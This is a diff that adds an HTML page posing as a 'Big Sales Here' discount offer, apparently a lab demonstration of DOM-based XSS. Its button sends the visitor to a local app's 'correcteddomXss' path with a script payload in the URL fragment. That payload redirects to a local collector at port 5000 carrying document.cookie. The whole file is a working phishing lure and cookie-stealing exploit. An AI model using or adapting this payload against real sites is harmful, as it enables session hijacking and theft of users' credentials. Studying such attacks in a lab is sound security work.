@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Big Sales Here</title>
+</head>
+<body>
+    <div style="width: 50%; margin: auto;">
+    <p>Hurry Offer ends soon!!</p>
+    <button onclick="myFunction()">Click Me To Get Discount</button>
+    </div>
+
+<script>
+    function myFunction() {
+        var scriptTag = "http://localhost:3000/correcteddomXss#name=%3Cscript%3Edocument.location=%22http://127.0.0.1:5000/?c=%22.concat(document.cookie)%3C/script%3E";
+        window.location.assign(scriptTag);
+    }
+ </script>
+ </body>
+</html>
